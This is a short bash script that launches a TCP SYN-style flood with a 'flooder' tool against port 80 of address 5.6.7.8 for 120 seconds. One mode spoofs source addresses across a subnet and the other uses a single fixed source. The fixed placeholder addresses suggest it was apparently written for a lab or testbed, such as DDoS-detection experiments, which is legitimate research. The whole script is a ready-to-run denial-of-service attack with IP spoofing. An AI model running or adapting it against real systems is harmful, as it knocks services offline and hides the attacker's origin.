#!/bin/bash

# Spoof or not
SPOOF=$1

# Timeout
TIMEOUT=120

if [[ $SPOOF == "spoof" ]]
then

    # Spoof flooder attack
    timeout $TIMEOUT flooder --dst 5.6.7.8 --highrate 200 --proto 6 --dportmin 80 --dportmax 80 --src 1.1.2.5 --srcmask 255.255.255.0

elif [[ $SPOOF == "nospoof" ]]
then

    # No spoof flooder attack
    timeout $TIMEOUT flooder --dst 5.6.7.8 --highrate 200 --proto 6 --dportmin 80 --dportmax 80 --src 1.1.2.4 --srcmask 255.255.255.255

else

    echo "Not valid input"
    exit 1

fi
